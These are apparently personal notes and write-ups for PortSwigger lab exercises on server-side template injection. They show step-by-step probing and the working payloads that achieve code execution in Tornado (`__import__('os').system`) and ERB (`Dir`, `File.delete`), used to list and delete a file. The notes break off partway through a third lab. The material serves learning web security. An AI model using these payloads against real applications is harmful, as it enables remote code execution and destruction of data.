# Server-side template injection
## Notes
[Identifying the template engine](https://portswigger.net/web-security/server-side-template-injection#identify)

Potentially useful, from [SSTI – Basic server-side template injection](https://sc.scomurr.com/ssti-basic-server-side-template-injection/): Try putting these [SSTI payloads](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz) into Burp Intruder

## Writeups
### [Lab: Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
Level: Practitioner\
Date completed: 2026-06-26\
Resources used: [tornado.template](https://www.tornadoweb.org/en/stable/template.html), [Bypass Python sandboxes](https://github.com/slytechroot/HackTricks/tree/master/generic-methodologies-and-resources/python/bypass-python-sandboxes)

I mucked around for a bit at first:
* `/post?postId=2*2` -> "Invalid blog post ID"
* [`/post?postId={% 2*2 %}`](https://www.tornadoweb.org/en/stable/template.html) -> "Invalid blog post ID"
* Tried making a comment with content `{{7*7}}` -> This created a new comment "{{7*7}}" by user "anonymous".
* Logged in as `wiener`, tried injecting into the email box -> It complained about all the special characters I tried
* `/my-account?id={{7*7}}` -> It sent me to the login page, nothing interesting happened

The lab hint said to look at the "preferred name" functionality, so I intercepted the dropdown POST request to inject things like `{% 3*3 %}` and `dir(user)` using Burp Repeater. But the webapp seemed to take whatever I gave it in stride -- no errors, but no results either. I couldn't tell if my input was being ignored.

Eventually I realized the variable `blog-post-author-display` would probably show its value in blog posts. I went through all of the blog posts looking for ones that `wiener` had authored, but there were none. I did see my anonymous comments, though. Bright idea: I made a new comment with content "asdf", this time while logged in as wiener. After reloading, my comment seemed to be posted under this username: `['__doc__', '__init__', '__module__', 'first_name', 'name', 'nickname']`. (It was in HTML-encoded format, but I [converted](https://codebeautify.org/html-decode-string) it for this writeup.)

Excellent! So now I have a way to see my Python output. I just have to see what libraries are at my disposal to find and delete files.

Here's what I got as my preferred name when I set it in Burp Repeater:
* `os.listdir('/')` -> `NameError: global name 'os' is not defined`
* `import os; os.listdir('/')` -> `SyntaxError: invalid syntax`
* `import os\nos.listdir('/')` -> `SyntaxError: invalid syntax`
* [`glob.glob("/")`](https://stackoverflow.com/questions/2759323/how-can-i-list-the-contents-of-a-directory-in-python) -> `NameError: global name 'glob' is not defined`
* `locals()` -> `{'_tt_buffer': [], '_tt_append': <built-in method append of list object at 0x7f2f86441f50>}`
* `globals()` -> Many functions, objects, exceptions, etc., but no `os` or `glob`.
* [`commands.getoutput("ls")`](https://github.com/slytechroot/HackTricks/tree/master/generic-methodologies-and-resources/python/bypass-python-sandboxes) -> `NameError: global name 'commands' is not defined`
* `subprocess.call("ls", shell=True)` -> `NameError: global name 'subprocess' is not defined`
* `importlib.import_module("os").system("ls")` -> `NameError: global name 'importlib' is not defined`
* `imp.load_source("os","/usr/lib/python2.7/os.py").system("ls")` -> `NameError: global name 'imp' is not defined`
* `__import__("os").system("ls")` -> `morale.txt`

Goal!

* `__import__("os").system("rm morale.txt")` -> Solved the lab!


### [Lab: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
Level: Practitioner\
Date completed: 2026-06-29\
Resources used: [ERB – Ruby Templating](https://docs.ruby-lang.org/en/2.3.0/ERB.html), [SSTI – Basic server-side template injection](https://sc.scomurr.com/ssti-basic-server-side-template-injection/), [Get names of all files from a folder with Ruby](https://stackoverflow.com/questions/1755665/get-names-of-all-files-from-a-folder-with-ruby)

I read enough [Ruby ERB documentation](https://docs.ruby-lang.org/en/2.3.0/ERB.html) to know expressions and code are interpreted in templates with `<% %>` and `<%= %>`. And I looked around Stack Overflow well enough to understand the thing I put between those percents would probably be `Dir[path]`.

I clicked around the website at first. The only place I noticed things potentially being interpreted by the backend was `GET /product?productId=`, but it seemed only to accept numbers. I tried jumping around to different product IDs, picking random numbers like 3 and 4 and 10. They all sent me to product pages, but I didn't really get anywhere with the lab. I spent a long time trying to inject anything that would cause a more interesting error than "Invalid product ID" or "Not Found". I wanted to eventually inject some sort of command into the template, but it seemed it would not accept anything other than numbers.

Eventually I got frustrated and looked at the first bit of [this walkthrough](https://sc.scomurr.com/ssti-basic-server-side-template-injection/), which recommended clicking on product 1. It turns out that product 1 specifically gives a message saying "Unfortunately this item is out of stock" instead of sending you to a product page. The error message was in the URL too: `/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`. I just hadn't guessed 1 when I was guessing product IDs.

These injections demonstrate `/?message=` is vulnerable to ERB injection:
* `<%= 2+2 %>` -> `/usr/lib/ruby/2.7.0/erb.rb:905:in eval': (erb):1: syntax error, unexpected integer literal, expecting ')' (SyntaxError) _erbout = +''; _erbout.<<(( 2 2 ).to_s); _erbout ^ from /usr/lib/ruby/2.7.0/erb.rb:905:in result' from -e:4:in <main>'`
* `<%= 2*2 %>` -> 4

I don't know why adding didn't work but multiplying did. Moving on. My next goal was to do `ls`.
* [`<% Dir["./..."] %>`](https://stackoverflow.com/questions/1755665/get-names-of-all-files-from-a-folder-with-ruby) -> No output
* [`<% Dir.entries["."] %>`](https://stackoverflow.com/a/1755666) -> `(erb):1:in open': wrong number of arguments (given 0, expected 1) (ArgumentError) from (erb):1:in entries' from (erb):1:in <main>' from /usr/lib/ruby/2.7.0/erb.rb:905:in eval' from /usr/lib/ruby/2.7.0/erb.rb:905:in result' from -e:4:in <main>'`
* `<% Dir['./*'] %>` -> No output
* `<% Dir['../*'] %>` -> No output
* `<% Dir['/*'] %>` -> No output

Then I realized I needed to use the [Ruby expression tag](https://docs.ruby-lang.org/en/2.3.0/ERB.html#class-ERB-label-Examples) instead of Ruby code if I wanted to see the output:
* `<%= Dir['./*'] %>` -> `["./morale.txt"]`

So that was my `ls`. That's most of the way there!

[The documentation for Dir mentioned `FileUtils.remove_entry dir`](https://docs.ruby-lang.org/en/2.3.0/Dir.html#:~:text=FileUtils%2Eremove%5Fentry%20dir), but the lab wants me to remove a file, not a directory. I searched "remove" in the Ruby documentation and selected the first result, the `remove` method of the `FileUtils` class:

* `<%= FileUtils.remove("./morale.txt") %>` -> `(erb):1:in <main>': uninitialized constant FileUtils (NameError) Did you mean? FileTest from /usr/lib/ruby/2.7.0/erb.rb:905:in eval' from /usr/lib/ruby/2.7.0/erb.rb:905:in result' from -e:4:in <main>'`

The error message mentioned FileTest, but [FileTest doesn't have any methods to delete files](https://docs.ruby-lang.org/en/2.3.0/FileTest.html). It does mention that "[FileTest's] methods are also insinuated into the File class", so I looked at [File](https://docs.ruby-lang.org/en/2.3.0/File.html) next.
* [`<%= File.delete("./morale.txt") %>`](https://docs.ruby-lang.org/en/2.3.0/File.html) -> Solved the lab!

### [Lab: Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
Level: Practitioner\
Date completed: 2026-06-29\
Resources used: 

First I logged in as `content-manager` with provided credentials. Tried injecting `{{7*7}}` into the "Update email" box, but that didn't work, of course. Next I tried changing `/my-account?id=content-manager` to `/my-account?id={{7*7}}`, but that sent me to a login page. So then I went to the products and clicked on one. I noticed this one has an "Edit template" button, which I haven't seen in other labs. Clicking it gives me an editable text box containing this:
```
<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>
```

I identified the template engine by following [this decision tree](https://portswigger.net/web-security/server-side-template-injection#identify):
* `${7*7}` -> 49
* `a{*comment*}b` -> Echoed, so it doesn't obey this command
* `${"z".join("ab")}` -> No output

Because it was inconclusive, I wanted to try a Mako command to see if it's Mako:
* [`<%inherit file="base.html"/>`](https://www.makotemplates.org/) -> Echoed, so I guess it's not Mako.

The only thing I know about it is that `${product.stock}` looks vaguely like Python.
